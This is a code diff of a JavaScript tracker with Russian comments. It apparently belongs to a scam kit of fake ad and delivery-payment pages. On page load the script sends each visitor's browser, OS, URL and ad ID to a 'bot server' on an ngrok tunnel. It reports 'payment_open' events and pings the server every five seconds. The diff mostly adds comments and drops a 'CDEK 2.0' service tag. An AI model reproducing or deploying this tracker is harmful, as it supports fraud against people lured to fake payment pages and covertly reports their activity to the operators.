@@ -1,10 +1,18 @@
+/**
+ * Логирование открытия страниц с объявлениями
+ * Отправляет информацию о пользователе и браузере на сервер бота
+ */
+
 (function() {
   'use strict';
 
   var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
 
-  var _logged = false;
+  var _logged = false; // защита от двойной отправки
 
+  /**
+   * Получает информацию о браузере и ОС
+   */
   function getBrowserInfo() {
     var ua = navigator.userAgent;
     var browser = 'Unknown';
@@ -53,6 +61,9 @@
     return { browser: browser, os: os, device: device };
   }
 
+  /**
+   * Получает ID объявления из URL
+   */
   function getAdIdFromUrl() {
     var pathMatch = window.location.pathname.match(/\/(AD\d{7})/);
     if (pathMatch) return pathMatch[1];
@@ -60,11 +71,14 @@
     return params.get('adId') || null;
   }
 
+  /**
+   * Отправляет heartbeat (пинг) для отслеживания онлайн-статуса
+   */
   function sendHeartbeat(adId) {
     if (!adId) return;
 
     var apiUrl = API_BASE + '/api/heartbeat';
-
+    
     fetch(apiUrl, {
       method: 'POST',
       headers: {
@@ -74,21 +88,24 @@
       body: JSON.stringify({ adId: adId })
     })
       .then(function(resp) { return resp.json(); })
-      .then(function(data) {})
-      .catch(function(err) {});
+      .then(function(data) {
+        // Heartbeat отправлен
+      })
+      .catch(function(err) {
+        // Ошибка отправки heartbeat
+      });
   }
 
-  function getFallbackId() {
-    return window.itemId || window.__currentAdId || null;
-  }
-
+  /**
+   * Отправляет событие открытия платежной системы
+   */
   function sendPaymentOpenEvent() {
-    var adId = window.__currentAdId || getAdIdFromUrl() || getFallbackId();
-    if (!adId) return;
+    var adId = window.__currentAdId || getAdIdFromUrl();
+    if (!adId) return;  // Убрали проверку _logged
 
     var info = getBrowserInfo();
     var title = (window.__currentAdData && window.__currentAdData.title) || 'Unknown';
-
+    
     var logData = {
       adId: adId,
       title: title,
@@ -97,8 +114,7 @@
       browser: info.browser,
       timestamp: new Date().toISOString(),
       url: window.location.href,
-      eventType: 'payment_open',
-      service: 'CDEK 2.0'
+      eventType: 'payment_open'
     };
 
     var apiUrl = API_BASE + '/api/log';
@@ -112,12 +128,18 @@
       body: JSON.stringify(logData)
     })
       .then(function(resp) { return resp.json(); })
-      .then(function(data) {})
-      .catch(function(err) {});
+      .then(function(data) {
+        // Событие открытия платежной системы отправлено
+      })
+      .catch(function(err) {
+        // Ошибка отправки события
+      });
   }
 
+  /**
+   * Отправляет лог на сервер
+   */
   function sendLog(adId, title) {
-    adId = adId || getFallbackId();
     if (!adId || _logged) return;
     _logged = true;
 
@@ -129,8 +151,7 @@
       os: info.os,
       browser: info.browser,
       timestamp: new Date().toISOString(),
-      url: window.location.href,
-      service: 'CDEK 2.0'
+      url: window.location.href
     };
 
     var apiUrl = API_BASE + '/api/log';
@@ -144,12 +165,19 @@
       body: JSON.stringify(logData)
     })
       .then(function(resp) { return resp.json(); })
-      .then(function(data) {})
-      .catch(function(err) {});
+      .then(function(data) {
+        // Лог отправлен
+      })
+      .catch(function(err) {
+        // Ошибка отправки лога
+      });
   }
 
+  /**
+   * Инициализирует логирование при загрузке страницы
+   */
   function initLogging() {
-    var adId = getAdIdFromUrl() || getFallbackId();
+    var adId = getAdIdFromUrl();
     if (!adId) {
       return;
     }
@@ -174,11 +202,13 @@
           };
         }
         sendLog(adId, title);
-
+        
+        // Запускаем heartbeat каждые 5 секунд
         setInterval(function() {
           sendHeartbeat(adId);
         }, 5000);
-
+        
+        // Отправляем первый heartbeat сразу
         sendHeartbeat(adId);
       })
       .catch(function(err) {
@@ -188,12 +218,14 @@
     window.__currentAdId = adId;
   }
 
+  // Инициализируем один раз при загрузке
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', initLogging);
   } else {
     initLogging();
   }
 
+  // Экспортируем API
   window.AdLogger = {
     getBrowserInfo: getBrowserInfo,
     getAdIdFromUrl: getAdIdFromUrl,
